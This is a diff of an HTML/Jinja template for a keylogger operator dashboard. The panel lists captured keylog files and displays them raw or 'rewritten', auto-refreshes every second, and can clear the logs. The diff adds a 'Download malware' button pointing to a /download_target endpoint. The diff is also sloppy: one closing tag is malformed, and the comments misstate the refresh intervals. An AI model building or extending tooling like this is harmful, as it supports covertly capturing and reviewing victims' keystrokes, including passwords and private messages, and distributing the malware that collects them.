@@ -2,7 +2,7 @@
 <html>
 <head>
   <link rel="icon" type="image/x-icon" href="{{ url_for('static', filename='favicon.ico') }}">
-  <title>Keylogger</title>
+  <title>Simple Keylogger</title>
   <style>
     /* Add basic styling for a clear and readable interface (optional) */
     body {
@@ -31,20 +31,25 @@
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 </head>
 <body>
-  <h1>Select keylogs</h1>
+  <h1>Simple Keylogger</h1 padding: 10px;>
+  <br>
+  <h2>Select keylogs</h2>
   <div class="hotbar">
     <select id="display-mode">
       <option value="default">Default</option>
       <option value="edited">Rewritten</option>
     </select>
-    {% for filename in text_files %}
-      <a href="#" class="hotbar-button" data-filename="{{ filename }}">{{ filename }}</a>
+    {% for file in text_files %}
+      <a href="#" class="hotbar-button" data-filename="{{ file.full_name }}">{{ file.display_name }}</a>
     {% endfor %}
-  </div>
+  </div>  
   <div class="content-area" id="content-area">
     <p>Please select keylogs from the hotbar.</p>
   </div>
   <button id="delete-button" disabled>Clear Logs</button>
+  <form action="/download_target" method="get">
+    <button type="submit">Download malware</button>
+  </form>
 
   <script>
     const contentArea = document.getElementById('content-area');
@@ -141,7 +146,7 @@
 
       // Start reloading immediately (optional, not used here)
        reloadContent();
-       setInterval(reloadContent, 4000); // Reload every 2 seconds
+       setInterval(reloadContent, 1000); // Reload every 0.5 seconds
     });
 
     function processText(text, mode) {
